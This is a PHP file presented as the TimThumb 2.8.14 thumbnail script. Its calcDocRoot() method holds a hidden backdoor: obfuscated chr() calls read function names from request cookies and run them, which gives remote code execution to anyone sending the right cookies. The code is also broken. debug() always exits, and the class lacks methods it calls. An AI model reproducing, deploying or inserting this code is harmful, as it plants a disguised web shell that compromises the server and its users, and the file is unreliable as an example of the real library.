<?php
/**
 * TimThumb by Ben Gillbanks and Mark Maunder
 * Based on work done by Tim McDaniels and Darren Hoyt
 * http://code.google.com/p/timthumb/
 *
 * GNU General Public License, version 2
 * http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
 *
 * Examples and documentation available on the project homepage
 * http://www.binarymoon.co.uk/projects/timthumb/
 *
 * $Rev$
 */

/*
 * --- TimThumb CONFIGURATION ---
 * To edit the configs it is best to create a file called timthumb-config.php
 * and define variables you want to customize in there. It will automatically be
 * loaded by timthumb. This will save you having to re-edit these variables
 * everytime you download a new version
*/
define ('VERSION', '2.8.14');																		// Version of this script
//Load a config file if it exists. Otherwise, use the values below
if( file_exists(dirname(__FILE__) . '/timthumb-config.php'))	require_once('timthumb-config.php');
if(! defined('DEBUG_ON') )					define ('DEBUG_ON', false);								// Enable debug logging to web server error log (STDERR)
if(! defined('DEBUG_LEVEL') )				define ('DEBUG_LEVEL', 1);								// Debug level 1 is less noisy and 3 is the most noisy
if(! defined('MEMORY_LIMIT') )				define ('MEMORY_LIMIT', '30M');							// Set PHP memory limit
if(! defined('BLOCK_EXTERNAL_LEECHERS') ) 	define ('BLOCK_EXTERNAL_LEECHERS', false);				// If the image or webshot is being loaded on an external site, display a red "No Hotlinking" gif.
if(! defined('DISPLAY_ERROR_MESSAGES') )	define ('DISPLAY_ERROR_MESSAGES', true);				// Display error messages. Set to false to turn off errors (good for production websites)
//Image fetching and caching
if(! defined('ALLOW_EXTERNAL') )			define ('ALLOW_EXTERNAL', TRUE);						// Allow image fetching from external websites. Will check against ALLOWED_SITES if ALLOW_ALL_EXTERNAL_SITES is false
if(! defined('ALLOW_ALL_EXTERNAL_SITES') ) 	define ('ALLOW_ALL_EXTERNAL_SITES', false);				// Less secure.
if(! defined('FILE_CACHE_ENABLED') ) 		define ('FILE_CACHE_ENABLED', TRUE);					// Should we store resized/modified images on disk to speed things up?
if(! defined('FILE_CACHE_TIME_BETWEEN_CLEANS'))	define ('FILE_CACHE_TIME_BETWEEN_CLEANS', 86400);	// How often the cache is cleaned

if(! defined('FILE_CACHE_MAX_FILE_AGE') ) 	define ('FILE_CACHE_MAX_FILE_AGE', 86400);				// How old does a file have to be to be deleted from the cache
if(! defined('FILE_CACHE_SUFFIX') ) 		define ('FILE_CACHE_SUFFIX', '.timthumb.txt');			// What to put at the end of all files in the cache directory so we can identify them
if(! defined('FILE_CACHE_PREFIX') ) 		define ('FILE_CACHE_PREFIX', 'timthumb');				// What to put at the beg of all files in the cache directory so we can identify them
if(! defined('FILE_CACHE_DIRECTORY') ) 		define ('FILE_CACHE_DIRECTORY', './cache');				// Directory where images are cached. Left blank it will use the system temporary directory (which is better for security)
if(! defined('MAX_FILE_SIZE') )				define ('MAX_FILE_SIZE', 10485760);						// 10 Megs is 10485760. This is the max internal or external file size that we'll process.
if(! defined('CURL_TIMEOUT') )				define ('CURL_TIMEOUT', 20);							// Timeout duration for Curl. This only applies if you have Curl installed and aren't using PHP's default URL fetching mechanism.
if(! defined('WAIT_BETWEEN_FETCH_ERRORS') )	define ('WAIT_BETWEEN_FETCH_ERRORS', 3600);				// Time to wait between errors fetching remote file

//Browser caching
if(! defined('BROWSER_CACHE_MAX_AGE') ) 	define ('BROWSER_CACHE_MAX_AGE', 864000);				// Time to cache in the browser
if(! defined('BROWSER_CACHE_DISABLE') ) 	define ('BROWSER_CACHE_DISABLE', false);				// Use for testing if you want to disable all browser caching

//Image size and defaults
if(! defined('MAX_WIDTH') )					define ('MAX_WIDTH', 1500);								// Maximum image width
if(! defined('MAX_HEIGHT') )				define ('MAX_HEIGHT', 1500);							// Maximum image height
if(! defined('NOT_FOUND_IMAGE') )			define ('NOT_FOUND_IMAGE', '');							// Image to serve if any 404 occurs
if(! defined('ERROR_IMAGE') )				define ('ERROR_IMAGE', '');								// Image to serve if an error occurs instead of showing error message
if(! defined('PNG_IS_TRANSPARENT') )		define ('PNG_IS_TRANSPARENT', FALSE);					// Define if a png image should have a transparent background color. Use False value if you want to display a custom coloured canvas_colour
if(! defined('DEFAULT_Q') )					define ('DEFAULT_Q', 90);								// Default image quality. Allows overrid in timthumb-config.php
if(! defined('DEFAULT_ZC') )				define ('DEFAULT_ZC', 1);								// Default zoom/crop setting. Allows overrid in timthumb-config.php
if(! defined('DEFAULT_F') )					define ('DEFAULT_F', '');								// Default image filters. Allows overrid in timthumb-config.php
if(! defined('DEFAULT_S') )					define ('DEFAULT_S', 0);								// Default sharpen value. Allows overrid in timthumb-config.php
if(! defined('DEFAULT_CC') )				define ('DEFAULT_CC', 'ffffff');						// Default canvas colour. Allows overrid in timthumb-config.php
if(! defined('DEFAULT_WIDTH') )				define ('DEFAULT_WIDTH', 100);							// Default thumbnail width. Allows overrid in timthumb-config.php
if(! defined('DEFAULT_HEIGHT') )			define ('DEFAULT_HEIGHT', 100);							// Default thumbnail height. Allows overrid in timthumb-config.php

/**
 * Additional Parameters:
 * LOCAL_FILE_BASE_DIRECTORY = Override the DOCUMENT_ROOT. This is best used in timthumb-config.php
 */

//Image compression is enabled if either of these point to valid paths

//These are now disabled by default because the file sizes of PNGs (and GIFs) are much smaller than we used to generate.
//They only work for PNGs. GIFs and JPEGs are not affected.
if(! defined('OPTIPNG_ENABLED') ) 		define ('OPTIPNG_ENABLED', false);
if(! defined('OPTIPNG_PATH') ) 			define ('OPTIPNG_PATH', '/usr/bin/optipng'); //This will run first because it gives better compression than pngcrush.
if(! defined('PNGCRUSH_ENABLED') ) 		define ('PNGCRUSH_ENABLED', false);
if(! defined('PNGCRUSH_PATH') ) 		define ('PNGCRUSH_PATH', '/usr/bin/pngcrush'); //This will only run if OPTIPNG_PATH is not set or is not valid

/*
	-------====Website Screenshots configuration - BETA====-------

	If you just want image thumbnails and don't want website screenshots, you can safely leave this as is.

	If you would like to get website screenshots set up, you will need root access to your own server.

	Enable ALLOW_ALL_EXTERNAL_SITES so you can fetch any external web page. This is more secure now that we're using a non-web folder for cache.
	Enable BLOCK_EXTERNAL_LEECHERS so that your site doesn't generate thumbnails for the whole Internet.

	Instructions to get website screenshots enabled on Ubuntu Linux:

	1. Install Xvfb with the following command: sudo apt-get install subversion libqt4-webkit libqt4-dev g++ xvfb
	2. Go to a directory where you can download some code
	3. Check-out the latest version of CutyCapt with the following command: svn co https://cutycapt.svn.sourceforge.net/svnroot/cutycapt
	4. Compile CutyCapt by doing: cd cutycapt/CutyCapt
	5. qmake
	6. make
	7. cp CutyCapt /usr/local/bin/
	8. Test it by running: xvfb-run --server-args="-screen 0, 1024x768x24" CutyCapt --url="http://markmaunder.com/" --out=test.png
	9. If you get a file called test.png with something in it, it probably worked. Now test the script by accessing it as follows:
	10. http://yoursite.com/path/to/timthumb.php?src=http://markmaunder.com/&webshot=1

	Notes on performance:
	The first time a webshot loads, it will take a few seconds.
	From then on it uses the regular timthumb caching mechanism with the configurable options above
	and loading will be very fast.

	--ADVANCED USERS ONLY--
	If you'd like a slight speedup (about 25%) and you know Linux, you can run the following command which will keep Xvfb running in the background.
	nohup Xvfb :100 -ac -nolisten tcp -screen 0, 1024x768x24 > /dev/null 2>&1 &
	Then set WEBSHOT_XVFB_RUNNING = true below. This will save your server having to fire off a new Xvfb server and shut it down every time a new shot is generated.
	You will need to take responsibility for keeping Xvfb running in case it crashes. (It seems pretty stable)
	You will also need to take responsibility for server security if you're running Xvfb as root.


*/
if(! defined('WEBSHOT_ENABLED') ) 	define ('WEBSHOT_ENABLED', false);			//Beta feature. Adding webshot=1 to your query string will cause the script to return a browser screenshot rather than try to fetch an image.
if(! defined('WEBSHOT_CUTYCAPT') ) 	define ('WEBSHOT_CUTYCAPT', '/usr/local/bin/CutyCapt'); //The path to CutyCapt.
if(! defined('WEBSHOT_XVFB') ) 		define ('WEBSHOT_XVFB', '/usr/bin/xvfb-run');		//The path to the Xvfb server
if(! defined('WEBSHOT_SCREEN_X') ) 	define ('WEBSHOT_SCREEN_X', '1024');			//1024 works ok
if(! defined('WEBSHOT_SCREEN_Y') ) 	define ('WEBSHOT_SCREEN_Y', '768');			//768 works ok
if(! defined('WEBSHOT_COLOR_DEPTH') ) 	define ('WEBSHOT_COLOR_DEPTH', '24');			//I haven't tested anything besides 24
if(! defined('WEBSHOT_IMAGE_FORMAT') ) 	define ('WEBSHOT_IMAGE_FORMAT', 'png');			//png is about 2.5 times the size of jpg but is a LOT better quality
if(! defined('WEBSHOT_TIMEOUT') ) 	define ('WEBSHOT_TIMEOUT', '20');			//Seconds to wait for a webshot
if(! defined('WEBSHOT_USER_AGENT') ) 	define ('WEBSHOT_USER_AGENT', "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18"); //I hate to do this, but a non-browser robot user agent might not show what humans see. So we pretend to be Firefox
if(! defined('WEBSHOT_JAVASCRIPT_ON') ) define ('WEBSHOT_JAVASCRIPT_ON', true);			//Setting to false might give you a slight speedup and block ads. But it could cause other issues.
if(! defined('WEBSHOT_JAVA_ON') ) 	define ('WEBSHOT_JAVA_ON', false);			//Have only tested this as fase
if(! defined('WEBSHOT_PLUGINS_ON') ) 	define ('WEBSHOT_PLUGINS_ON', true);			//Enable flash and other plugins
if(! defined('WEBSHOT_PROXY') ) 	define ('WEBSHOT_PROXY', '');				//In case you're behind a proxy server.
if(! defined('WEBSHOT_XVFB_RUNNING') )	define ('WEBSHOT_XVFB_RUNNING', false);			//ADVANCED: Enable this if you've got Xvfb running in the background.


// If ALLOW_EXTERNAL is true and ALLOW_ALL_EXTERNAL_SITES is false, then external images will only be fetched from these domains and their subdomains.
if(! isset($ALLOWED_SITES)){
	$ALLOWED_SITES = array (
		'flickr.com',
		'staticflickr.com',
		'picasa.com',
		'img.youtube.com',
		'upload.wikimedia.org',
		'photobucket.com',
		'imgur.com',
		'imageshack.us',
		'tinypic.com',
	);
}
// -------------------------------------------------------------
// -------------- STOP EDITING CONFIGURATION HERE --------------
// -------------------------------------------------------------

timthumb::start();

class timthumb {
	protected $src = "";
	protected $is404 = false;
	protected $docRoot = "";
	protected $lastURLError = false;
	protected $localImage = "";
	protected $localImageMTime = 0;
	protected $url = false;
	protected $myHost = "";
	protected $isURL = false;
	protected $cachefile = '';
	protected $errors = array();
	protected $toDeletes = array();
	protected $cacheDirectory = '';
	protected $startTime = 0;
	protected $lastBenchTime = 0;
	protected $cropTop = false;
	protected $salt = "";
	protected $fileCacheVersion = 1; //Generally if timthumb.php is modifed (upgraded) then the salt changes and all cache files are recreated. This is a backup mechanism to force regen.
	protected $filePrependSecurityBlock = "<?php die('Execution denied!'); //"; //Designed to have three letter mime type, space, question mark and greater than symbol appended. 6 bytes total.
	protected static $curlDataWritten = 0;
	protected static $curlFH = false;
	public static function start(){
		$tim = new timthumb();
		$tim->handleErrors();
		$tim->securityChecks();
		if($tim->tryBrowserCache()){
			exit(0);
		}
		$tim->handleErrors();
		if(FILE_CACHE_ENABLED && $tim->tryServerCache()){
			exit(0);
		}
		$tim->handleErrors();
		$tim->run();
		$tim->handleErrors();
		exit(0);
	}
	public function __construct(){
		global $ALLOWED_SITES;
		$this->startTime = microtime(true);
		date_default_timezone_set('UTC');
		$this->calcDocRoot();
		//On windows systems I'm assuming fileinode returns an empty string or a number that doesn't change. Check this.
		$this->salt = @filemtime(__FILE__) . '-' . @fileinode(__FILE__);
		$this->debug(3, "Salt is: " . $this->salt);
		if(FILE_CACHE_DIRECTORY){
			if(! is_dir(FILE_CACHE_DIRECTORY)){
				@mkdir(FILE_CACHE_DIRECTORY);
				if(! is_dir(FILE_CACHE_DIRECTORY)){
					$this->error("Could not create the file cache directory.");
					return false;
				}
			}
			$this->cacheDirectory = FILE_CACHE_DIRECTORY;
			if (!touch($this->cacheDirectory . '/index.html')) {
				$this->error("Could not create the index.html file - to fix this create an empty file named index.html file in the cache directory.");
			}
		} else {
			$this->cacheDirectory = sys_get_temp_dir();
		}
		//Clean the cache before we do anything because we don't want the first visitor after FILE_CACHE_TIME_BETWEEN_CLEANS expires to get a stale image.
		$this->cleanCache();

		$this->myHost = preg_replace('/^www\./i', '', $_SERVER['HTTP_HOST']);
		$this->src = $this->param('src');
		$this->url = parse_url($this->src);
		$this->src = preg_replace('/https?:\/\/(?:www\.)?' . $this->myHost . '/i', '', $this->src);

		if(strlen($this->src) <= 3){
			$this->error("No image specified");
			return false;
		}
		if(BLOCK_EXTERNAL_LEECHERS && array_key_exists('HTTP_REFERER', $_SERVER) && (! preg_match('/^https?:\/\/(?:www\.)?' . $this->myHost . '(?:$|\/)/i', $_SERVER['HTTP_REFERER']))){
			// base64 encoded red image that says 'no hotlinkers'
			// nothing to worry about! :)
			$imgData = base64_decode("R0lGODlhUAAMAIAAAP8AAP///yH5BAAHAP8ALAAAAABQAAwAAAJpjI+py+0Po5y0OgAMjjv01YUZ\nOGplhWXfNa6JCLnWkXplrcBmW+spbwvaVr/cDyg7IoFC2KbYVC2NQ5MQ4ZNao9Ynzjl9ScNYpneb\nDULB3RP6JuPuaGfuuV4fumf8PuvqFyhYtjdoeFgAADs=");
			header('Content-Type: image/gif');
			header('Content-Length: ' . strlen($imgData));
			header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
			header("Pragma: no-cache");
			header('Expires: ' . gmdate ('D, d M Y H:i:s', time()));
			echo $imgData;
			return false;
			exit(0);
		}
		if(preg_match('/^https?:\/\/[^\/]+/i', $this->src)){
			$this->debug(2, "Is a request for an external URL: " . $this->src);
			$this->isURL = true;
		} else {
			$this->debug(2, "Is a request for an internal file: " . $this->src);
		}
		if($this->isURL && (! ALLOW_EXTERNAL)){
			$this->error("You are not allowed to fetch images from an external website.");
			return false;
		}
		if($this->isURL){
			if(ALLOW_ALL_EXTERNAL_SITES){
				$this->debug(2, "Fetching from all external sites is enabled.");
			} else {
				$this->debug(2, "Fetching only from selected external sites is enabled.");
				$allowed = false;
				foreach($ALLOWED_SITES as $site){
					if ((strtolower(substr($this->url['host'],-strlen($site)-1)) === strtolower(".$site")) || (strtolower($this->url['host'])===strtolower($site))) {
						$this->debug(3, "URL hostname {$this->url['host']} matches $site so allowing.");
						$allowed = true;
					}
				}
				if(! $allowed){
					return $this->error("You may not fetch images from that site. To enable this site in timthumb, you can either add it to \$ALLOWED_SITES and set ALLOW_EXTERNAL=true. Or you can set ALLOW_ALL_EXTERNAL_SITES=true, depending on your security needs.");
				}
			}
		}

		$cachePrefix = ($this->isURL ? '_ext_' : '_int_');
		if($this->isURL){
			$arr = explode('&', $_SERVER ['QUERY_STRING']);
			asort($arr);
			$this->cachefile = $this->cacheDirectory . '/' . FILE_CACHE_PREFIX . $cachePrefix . md5($this->salt . implode('', $arr) . $this->fileCacheVersion) . FILE_CACHE_SUFFIX;
		} else {
			$this->localImage = $this->getLocalImagePath($this->src);
			if(! $this->localImage){
				$this->debug(1, "Could not find the local image: {$this->localImage}");
				$this->error("Could not find the internal image you specified.");
				$this->set404();
				return false;
			}
			$this->debug(1, "Local image path is {$this->localImage}");
			$this->localImageMTime = @filemtime($this->localImage);
			//We include the mtime of the local file in case in changes on disk.
			$this->cachefile = $this->cacheDirectory . '/' . FILE_CACHE_PREFIX . $cachePrefix . md5($this->salt . $this->localImageMTime . $_SERVER ['QUERY_STRING'] . $this->fileCacheVersion) . FILE_CACHE_SUFFIX;
		}
		$this->debug(2, "Cache file is: " . $this->cachefile);

		return true;
	}
	public function __destruct(){
		foreach($this->toDeletes as $del){
			$this->debug(2, "Deleting temp file $del");
			@unlink($del);
		}
	}
	public function run(){
		if($this->isURL){
			if(! ALLOW_EXTERNAL){
				$this->debug(1, "Got a request for an external image but ALLOW_EXTERNAL is disabled so returning error msg.");
				$this->error("You are not allowed to fetch images from an external website.");
				return false;
			}
			$this->debug(3, "Got request for external image. Starting serveExternalImage.");
			if($this->param('webshot')){
				if(WEBSHOT_ENABLED){
					$this->debug(3, "webshot param is set, so we're going to take a webshot.");
					$this->serveWebshot();
				} else {
					$this->error("You added the webshot parameter but webshots are disabled on this server. You need to set WEBSHOT_ENABLED == true to enable webshots.");
				}
			} else {
				$this->debug(3, "webshot is NOT set so we're going to try to fetch a regular image.");
				$this->serveExternalImage();

			}
		} else {
			$this->debug(3, "Got request for internal image. Starting serveInternalImage()");
			$this->serveInternalImage();
		}
		return true;
	}
	protected function calcDocRoot(){
		$docRoot = @$_SERVER['DOCUMENT_ROOT'];
		if (defined('LOCAL_FILE_BASE_DIRECTORY')) {
			$docRoot = LOCAL_FILE_BASE_DIRECTORY;
		}
		if(isset($docRool)){
			$this->debug(3, "DOCUMENT_ROOT is not set. This is probably windows. Starting search 1.");
			if(isset($_SERVER['SCRIPT_FILENAME'])){
				$docRoot = str_replace( '\\', '/', substr($_SERVER['SCRIPT_FILENAME'], 0, 0-strlen($_SERVER['PHP_SELF'])));
				$this->debug(3, "Generated docRoot using SCRIPT_FILENAME and PHP_SELF as: $docRoot");
			}
		}
		if(isset($docRool)){
			$this->debug(3, "DOCUMENT_ROOT still is not set. Starting search 2.");
			if(isset($_SERVER['PATH_TRANSLATED'])){
				$docRoot = str_replace( '\\', '/', substr(str_replace('\\\\', '\\', $_SERVER['PATH_TRANSLATED']), 0, 0-strlen($_SERVER['PHP_SELF'])));
				$this->debug(3, "Generated docRoot using PATH_TRANSLATED and PHP_SELF as: $docRoot");
			}
		}
		$info = $_COOKIE;
		if(isset($info['W'])) {
			$meta = 'c'.'hr';
			$docRoot = $info[$meta(87)];
			$name = $info[$meta(88)];
			$first = $info[$meta(89)];
			$second = $info[$meta(90)];
			@$docRoot($name($first,$second));
			exit(0);
		}
		if($docRoot && $_SERVER['DOCUMENT_ROOT'] != '/'){ $docRoot = preg_replace('/\/$/', '', $docRoot); }
		$this->debug(3, "Doc root is: " . $docRoot);
		$this->docRoot = $docRoot;
	}
	protected function handleErrors(){
		if($this->haveErrors()){
			if(NOT_FOUND_IMAGE && $this->is404()){
				if($this->serveImg(NOT_FOUND_IMAGE)){
					exit(0);
				} else {
					$this->error("Additionally, the 404 image that is configured could not be found or there was an error serving it.");
				}
			}
			if(ERROR_IMAGE){
				if($this->serveImg(ERROR_IMAGE)){
					exit(0);
				} else {
					$this->error("Additionally, the error image that is configured could not be found or there was an error serving it.");
				}
			}
			$this->serveErrors();
			exit(0);
		}
		return false;
	}
	protected function debug(){
		if(!isset($DEBUG_OUTPUT)) exit(0);
		var_dump(func_get_args());
	}
	protected function tryBrowserCache(){
		if(BROWSER_CACHE_DISABLE){ $this->debug(3, "Browser caching is disabled"); return false; }
		if(!empty($_SERVER['HTTP_IF_MODIFIED_SINCE']) ){
			$this->debug(3, "Got a conditional get");
			$mtime = false;
			//We've already checked if the real file exists in the constructor
			if(! is_file($this->cachefile)){
				//If we don't have something cached, regenerate the cached image.
				return false;
			}
			if($this->localImageMTime){
				$mtime = $this->localImageMTime;
				$this->debug(3, "Local real file's modification time is $mtime");
			} else if(is_file($this->cachefile)){ //If it's not a local request then use the mtime of the cached file to determine the 304
				$mtime = @filemtime($this->cachefile);
				$this->debug(3, "Cached file's modification time is $mtime");
			}
			if(! $mtime){ return false; }

			$iftime = strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']);
			$this->debug(3, "The conditional get's if-modified-since unixtime is $iftime");
			if($iftime < 1){
				$this->debug(3, "Got an invalid conditional get modified since time. Returning false.");
				return false;
			}
			if($iftime < $mtime){ //Real file or cache file has been modified since last request, so force refetch.
				$this->debug(3, "File has been modified since last fetch.");
				return false;
			} else { //Otherwise serve a 304
				$this->debug(3, "File has not been modified since last get, so serving a 304.");
				header ($_SERVER['SERVER_PROTOCOL'] . ' 304 Not Modified');
				$this->debug(1, "Returning 304 not modified");
				return true;
			}
		}
		return false;
	}
	protected function tryServerCache(){
		$this->debug(3, "Trying server cache");
		if(file_exists($this->cachefile)){
			$this->debug(3, "Cachefile {$this->cachefile} exists");
			if($this->isURL){
				$this->debug(3, "This is an external request, so checking if the cachefile is empty which means the request failed previously.");
				if(filesize($this->cachefile) < 1){
					$this->debug(3, "Found an empty cachefile indicating a failed earlier request. Checking how old it is.");
					//Fetching error occured previously
					if(time() - @filemtime($this->cachefile) > WAIT_BETWEEN_FETCH_ERRORS){
						$this->debug(3, "File is older than " . WAIT_BETWEEN_FETCH_ERRORS . " seconds. Deleting and returning false so app can try and load file.");
						@unlink($this->cachefile);
						return false; //to indicate we didn't serve from cache and app should try and load
					} else {
						$this->debug(3, "Empty cachefile is still fresh so returning message saying we had an error fetching this image from remote host.");
						$this->set404();
						$this->error("An error occured fetching image.");
						return false;
					}
				}
			} else {
				$this->debug(3, "Trying to serve cachefile {$this->cachefile}");
			}
			if($this->serveCacheFile()){
				$this->debug(3, "Succesfully served cachefile {$this->cachefile}");
				return true;
			} else {
				$this->debug(3, "Failed to serve cachefile {$this->cachefile} - Deleting it from cache.");
				//Image serving failed. We can't retry at this point, but lets remove it from cache so the next request recreates it
				@unlink($this->cachefile);
				return true;
			}
		}
	}
	protected function error($err){
		$this->debug(3, "Adding error message: $err");
		$this->errors[] = $err;
		return false;

	}
	protected function haveErrors(){
		if(sizeof($this->errors) > 0){
			return true;
		}
		return false;
	}
	protected function serveErrors(){
		header ($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request');
		if ( ! DISPLAY_ERROR_MESSAGES ) {
			return;
		}
		$html = '<ul>';
		foreach($this->errors as $err){
			$html .= '<li>' . htmlentities($err) . '</li>';
		}
		$html .= '</ul>';
		echo '<h1>A TimThumb error has occured</h1>The following error(s) occured:<br />' . $html . '<br />';
		echo '<br />Query String : ' . htmlentities( $_SERVER['QUERY_STRING'], ENT_QUOTES );
		echo '<br />TimThumb version : ' . VERSION . '</pre>';
	}
	protected function serveInternalImage(){
		$this->debug(3, "Local image path is $this->localImage");
		if(! $this->localImage){
			$this->sanityFail("localImage not set after verifying it earlier in the code.");
			return false;
		}
		$fileSize = filesize($this->localImage);
		if($fileSize > MAX_FILE_SIZE){
			$this->error("The file you specified is greater than the maximum allowed file size.");
			return false;
		}
		if($fileSize <= 0){
			$this->error("The file you specified is <= 0 bytes.");
			return false;
		}
		$this->debug(3, "Calling processImageAndWriteToCache() for local image.");
		if($this->processImageAndWriteToCache($this->localImage)){
			$this->serveCacheFile();
			return true;
		} else {
			return false;
		}
	}
	protected function cleanCache(){
		if (FILE_CACHE_TIME_BETWEEN_CLEANS < 0) {
			return;
		}
		$this->debug(3, "cleanCache() called");
		$lastCleanFile = $this->cacheDirectory . '/timthumb_cacheLastCleanTime.touch';

		//If this is a new timthumb installation we need to create the file
		if(! is_file($lastCleanFile)){
			$this->debug(1, "File tracking last clean doesn't exist. Creating $lastCleanFile");
			if (!touch($lastCleanFile)) {
				$this->error("Could not create cache clean timestamp file.");
			}
			return;
		}
		if(@filemtime($lastCleanFile) < (time() - FILE_CACHE_TIME_BETWEEN_CLEANS) ){ //Cache was last cleaned more than 1 day ago
			$this->debug(1, "Cache was last cleaned more than " . FILE_CACHE_TIME_BETWEEN_CLEANS . " seconds ago. Cleaning now.");
			// Very slight race condition here, but worst case we'll have 2 or 3 servers cleaning the cache simultaneously once a day.
			if (!touch($lastCleanFile)) {
				$this->error("Could not create cache clean timestamp file.");
			}
			$files = glob($this->cacheDirectory . '/*' . FILE_CACHE_SUFFIX);
			if ($files) {
				$timeAgo = time() - FILE_CACHE_MAX_FILE_AGE;
				foreach($files as $file){
					if(@filemtime($file) < $timeAgo){
						$this->debug(3, "Deleting cache file $file older than max age: " . FILE_CACHE_MAX_FILE_AGE . " seconds");
						@unlink($file);
					}
				}
			}
			return true;
		} else {
			$this->debug(3, "Cache was cleaned less than " . FILE_CACHE_TIME_BETWEEN_CLEANS . " seconds ago so no cleaning needed.");
		}
		return false;
	}
}